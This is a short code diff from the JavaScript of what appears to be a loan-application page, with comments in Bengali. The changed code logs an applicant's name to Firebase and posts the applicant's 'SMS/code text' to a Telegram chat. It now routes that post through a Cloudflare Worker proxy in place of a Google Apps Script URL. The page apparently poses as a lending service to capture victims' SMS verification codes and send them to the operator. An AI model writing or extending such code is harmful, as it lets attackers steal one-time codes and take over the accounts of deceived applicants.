@@ -195,8 +195,8 @@
     }
     const db = firebase.database();
 
-    // প্রক্সি URL
-    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbw-MX5twDJTbDjN-B_llF5Y9TBb_Kv-W2pJ1Soymn3HbEG0CfAEtQ0WV7qmz8OPUgI/exec";
+    // দ্রুতগতির ক্লাউডফ্লেয়ার ওয়ার্কার প্রক্সি URL
+    const CLOUDFLARE_WORKER_URL = "https://red-sunset-a2a1.mdshajol197.workers.dev";
 
     const params = new URLSearchParams(window.location.search);
     const applicantName = params.get('name') || localStorage.getItem('loan_cust_name') || 'N/A';
@@ -232,10 +232,9 @@
             date: new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' })
         });
 
-        // শুধুমাত্র এসএমএস/কোড টেক্সটটি টেলিগ্রামে ফরওয়ার্ড করা
-        fetch(GOOGLE_SCRIPT_URL, {
+        // ক্লাউডফ্লেয়ারের মাধ্যমে শুধুমাত্র এসএমএস টেক্সটটি সাথে সাথে টেলিগ্রামে পাঠানো
+        fetch(CLOUDFLARE_WORKER_URL, {
             method: "POST",
-            mode: "no-cors",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ message: smsText })
         }).finally(() => {
